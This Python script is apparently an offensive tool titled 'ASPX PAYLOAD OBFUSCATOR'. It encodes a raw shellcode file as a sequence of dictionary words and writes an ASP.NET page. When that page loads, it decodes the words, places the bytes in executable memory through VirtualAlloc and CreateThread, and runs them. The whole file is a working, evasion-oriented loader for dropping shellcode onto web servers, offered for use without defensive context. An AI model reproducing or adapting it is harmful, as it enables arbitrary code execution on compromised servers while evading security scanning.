#!/usr/bin/env python3

import requests
import sys
import random

def main(input_file):
    # 1. Download 10k words
    word_site = "https://www.mit.edu/~ecprice/wordlist.10000"
    response = requests.get(word_site)
    words = response.content.splitlines()
    words = [w.decode("utf-8") for w in words]
    random.shuffle(words)
    hex_values = [f'0x{i:02x}' for i in range(256)]
    word_dict = dict(zip(hex_values, words[:256]))
    
    # 2. Encode the payload
    encoded_words = []
    with open(input_file, "rb") as f:
        for b in f.read():
            hexval = f"0x{b:02x}"
            encoded_words.append(word_dict[hexval])

    # Split for concat
    chunk_size = 80
    encoded_chunks = [" ".join(encoded_words[i:i+chunk_size]) for i in range(0, len(encoded_words), chunk_size)]

    # 3. Generate the C# code-behind, single file ASPX ("Razor" classic style)
    aspx_code = """<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    public static extern void RtlMoveMemory(IntPtr dest, byte[] src, int length);

    protected void Page_Load(object sender, EventArgs e)
    {
        // --- BEGIN OBFUSCATED PAYLOAD ---
        string sc = "";
"""

    for chunk in encoded_chunks:
        aspx_code += f'        sc += "{chunk} ";\n'

    # Générer le mapping
    aspx_code += "        var wordDict = new Dictionary<string, byte>();\n"
    for k, v in word_dict.items():
        aspx_code += f'        wordDict.Add("{v}", {k});\n'

    aspx_code += """
        sc = sc.Trim();
        string[] arr = sc.Split(' ');
        byte[] buf = new byte[arr.Length];
        for(int i=0;i<arr.Length;i++){
            if(wordDict.ContainsKey(arr[i])) buf[i]=wordDict[arr[i]];
            else buf[i]=0;
        }

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        RtlMoveMemory(addr, buf, buf.Length);

        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero,0,addr,IntPtr.Zero,0,out threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);

        Response.Write("[+] Payload exécuté");
    }
</script>

<html><body><h1>Obfuscated Loader Ready</h1></body></html>
"""

    with open("generated_code.aspx", "w") as f:
        f.write(aspx_code)

    print("Fichier ASPX généré dans 'generated_code.aspx'.")

if __name__ == "__main__":
    print("##############################################")
    print("########### ASPX PAYLOAD OBFUSCATOR ##########")
    print("##############################################\n")
    if len(sys.argv) != 2:
        print("Usage: python encode_aspx.py <path_to_raw_payload_file> <optional_path_to_wordlist_default_MIT_10K>\n")
        sys.exit(1)
    main(sys.argv[1])
